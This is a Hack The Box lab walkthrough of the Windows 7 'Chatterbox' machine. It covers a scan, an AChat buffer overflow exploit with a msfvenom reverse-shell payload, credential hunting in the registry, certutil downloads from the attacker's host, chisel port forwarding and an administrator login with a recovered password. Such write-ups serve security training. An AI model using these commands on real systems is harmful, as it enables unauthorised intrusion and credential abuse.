# Hackthebox - Chatterbox

## Nmap

```
┌──(root💀kali)-[~]
└─# nmap -T4 -A -p- 10.10.10.74              
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-02 07:47 EDT
Nmap scan report for 10.10.10.74
Host is up (0.022s latency).
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  http         AChat chat system httpd
|_http-server-header: AChat
|_http-title: Site doesn't have a title.
9256/tcp  open  achat        AChat chat system
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=4/2%OT=135%CT=1%CU=38815%PV=Y%DS=2%DC=T%G=Y%TM=6248383
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=F7%GCD=1%ISR=FE%TI=I%CI=I%II=I%SS=S%TS=7)
OS:OPS(O1=M505NW8ST11%O2=M505NW8ST11%O3=M505NW8NNT11%O4=M505NW8ST11%O5=M505
OS:NW8ST11%O6=M505ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
OS:ECN(R=Y%DF=Y%T=80%W=2000%O=M505NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=
OS:80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%
OS:Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=
OS:A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=
OS:Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%
OS:T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h22m42s, deviation: 2h18m34s, median: 5h02m41s
| smb2-time: 
|   date: 2022-04-02T16:51:53
|_  start_date: 2022-04-02T16:29:48
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-04-02T12:51:52-04:00

TRACEROUTE (using port 23/tcp)
HOP RTT      ADDRESS
1   23.16 ms 10.10.14.1
2   23.35 ms 10.10.10.74

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 115.78 seconds

```

## Initial access

### AChat

- With some research on this program it seems to be a buffer overflow, there's an exploit made for it [here](https://www.exploit-db.com/raw/36025)
- Let's get the exploit on our machine `wget https://www.exploit-db.com/raw/36025`
- We just need to change the payload and do this instead because we want to get a reverse shell (not launch calc as the exploit payload is doing): 
```
msfvenom -a x86 --platform Windows -p 'windows/shell_reverse_tcp' LHOST=10.10.14.4 LPORT=1234 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```
- Now we can replace the buffer in the exploit script with our buffer, we also need to change the server adress with the ip of the target `10.10.10.74`
- We launch the python script (wont work with python3 we need to use python2)  
![image](https://user-images.githubusercontent.com/96747355/161382880-61c2adae-906c-42fb-bb15-1d26aa0a7361.png)

- We get a shell
![image](https://user-images.githubusercontent.com/96747355/161382182-e8c773da-e2de-41a9-9655-b1d05d7089e2.png)  
```
whoami
chatterbox\alfred
```

- Let's get the user flag
```
cd C:\Users\Alfred\Desktop
type user.txt
```

## Post Attack Enumeration

- `systeminfo`
```
Host Name:                 CHATTERBOX
OS Name:                   Microsoft Windows 7 Professional 
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00371-222-9819843-86663
Original Install Date:     12/10/2017, 9:18:19 AM
System Boot Time:          4/2/2022, 12:29:38 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,574 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,643 MB
Virtual Memory: In Use:    452 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\CHATTERBOX
[STRIPPED]
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection 4
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.74
```
- `net users`
```
User accounts for \\CHATTERBOX

-------------------------------------------------------------------------------
Administrator            Alfred                   Guest                    
The command completed successfully.
```
- `net localgroup`
```
Aliases for \\CHATTERBOX

-------------------------------------------------------------------------------
*Administrators
*Backup Operators
*Cryptographic Operators
*Distributed COM Users
*Event Log Readers
*Guests
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Remote Desktop Users
*Replicator
*Users
The command completed successfully.
```
- `netstat -ano`
```
Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       356
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       716
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       904
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       456
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       1032
  TCP    0.0.0.0:49157          0.0.0.0:0              LISTENING       464
  TCP    10.10.10.74:139        0.0.0.0:0              LISTENING       4
  TCP    10.10.10.74:9255       0.0.0.0:0              LISTENING       3100
  TCP    10.10.10.74:9256       0.0.0.0:0              LISTENING       3100
  TCP    10.10.10.74:49158      10.10.14.4:1234        ESTABLISHED     3100
  TCP    [::]:135               [::]:0                 LISTENING       664
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:49152             [::]:0                 LISTENING       356
  TCP    [::]:49153             [::]:0                 LISTENING       716
  TCP    [::]:49154             [::]:0                 LISTENING       904
  TCP    [::]:49155             [::]:0                 LISTENING       456
  TCP    [::]:49156             [::]:0                 LISTENING       1032
  TCP    [::]:49157             [::]:0                 LISTENING       464
  UDP    0.0.0.0:123            *:*                                    872
  UDP    0.0.0.0:500            *:*                                    904
  UDP    0.0.0.0:4500           *:*                                    904
  UDP    0.0.0.0:5355           *:*                                    1104
  UDP    10.10.10.74:137        *:*                                    4
  UDP    10.10.10.74:138        *:*                                    4
  UDP    10.10.10.74:1900       *:*                                    3384
  UDP    10.10.10.74:9256       *:*                                    3100
  UDP    10.10.10.74:59445      *:*                                    3384
  UDP    127.0.0.1:1900         *:*                                    3384
  UDP    127.0.0.1:59446        *:*                                    3384
  UDP    [::]:123               *:*                                    872
  UDP    [::]:500               *:*                                    904
  UDP    [::]:4500              *:*                                    904
  UDP    [::1]:1900             *:*                                    3384
  UDP    [::1]:59444            *:*                                    3384
```
  - The established connection is my reverse shell
  - On the top we see some local port that open including 445 which is smb so a share might be available locally
- Let's check for passwords using this `findstr /si password *.txt *.ini *.config *.sql` - we do not seem to get anything
- Let's try with the registry `reg query HKLM /f password /t REG_SZ /s` We get something interesting, we have a default password!
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    DefaultPassword    REG_SZ    Welcome1!
```
- Let's check winlogon further
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ    
    LegalNoticeText    REG_SZ    
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    ShutdownWithoutLogon    REG_SZ    0
    WinStationsDisabled    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    scremoveoption    REG_SZ    0
    ShutdownFlags    REG_DWORD    0x11
    DefaultDomainName    REG_SZ    
    DefaultUserName    REG_SZ    Alfred
    AutoAdminLogon    REG_SZ    1
    DefaultPassword    REG_SZ    Welcome1!

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\AutoLogonChecked
```
- Let's try to use the password on the local smb, but first we need to do some port forwarding
- We need to get plink in our attacking machine and transfer it to the target
  - `wget https://the.earth.li/~sgtatham/putty/latest/w32/plink.exe`
  - `python3 -m http.server 80`
  - In our target we browse to a directory where we have write access (Alfred's desktop for instamnce) and we get plink `certutil.exe -urlcache -f http://10.10.14.4/plink.exe plink.exe`
- We are going to launch ssh in our kali in our /etc/ssh/sshd_config PermitRootLogin should be set to yes `PermitRootLogin yes`
- `service ssh start`
- Now we can port forward smb with plink from our target machine: `plink.exe -l root -pw your-kali-password-here -R 445:127.0.0.1:445 10.10.14.4` 
  - For more infor on this check out this [article by UY](https://informationsecurity.medium.com/remote-ssh-tunneling-with-plink-exe-7831072b3d7d)
- For some reason I am not able to connect to my own machine using ssh so I gonna try with chisel
- On my kali `chisel server --reverse` (it going to listen on port 8080)
- On the target `.\chisel.exe client 10.10.14.4:8080 R:445:127.0.0.1:445`
- It seems to work
![image](https://user-images.githubusercontent.com/96747355/161387046-ca2121ae-98af-4e64-8c75-909d33959675.png)  
![image](https://user-images.githubusercontent.com/96747355/161387144-75e25b0e-43e6-43dd-953b-2a12fb3f9436.png)  
- Now we can use winexe from our machine and connect with administrator using the discovered password `winexe -U Administrator%Welcome1! //127.0.0.1 "cmd.exe"`
- And we get a root shell!
![image](https://user-images.githubusercontent.com/96747355/161387309-0d3782c8-9381-4c24-8c46-c2775e1f6b5a.png)
- And we can grab the root flag  
